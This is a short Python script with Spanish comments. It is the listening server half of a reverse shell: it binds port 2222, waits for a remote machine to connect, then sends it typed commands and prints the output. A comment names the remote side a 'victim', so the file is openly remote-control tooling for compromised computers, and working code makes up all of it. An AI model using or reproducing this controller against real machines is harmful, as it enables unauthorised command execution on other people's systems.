import socket
import sys


# Crea un socket ( conecta 2 computadoras)
def crea_socket():
    try:
        global host
        global puerto
        global s
        host = ""
        puerto = 2222
        s = socket.socket()

    except socket.error as msg:
        print("Error creando el socket: " + str(msg))


# Enlaza el socket y escucha por conexiones
def enlaza_socket():
    try:
        global host
        global puerto
        global s
        print("Enlazando el puerto: " + str(puerto))

        s.bind((host, puerto))
        s.listen(5)

    except socket.error as msg:
        print("Error enlazando el socket: " + str(msg) + "\n" + "Retrying...")
        enlaza_socket()


# Establece conexión con un cliente (socket debe de estar escuchando)
def accepta_socket():
    conn, address = s.accept()
    print("La conexión ha sido establecida! |" + " IP " + address[0] + " | Puerto" + str(address[1]))
    envia_comandos(conn)
    conn.close()

# Envía comandos al client/victim or a friend
def envia_comandos(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")


def main():
    crea_socket()
    enlaza_socket()
    accepta_socket()


main()
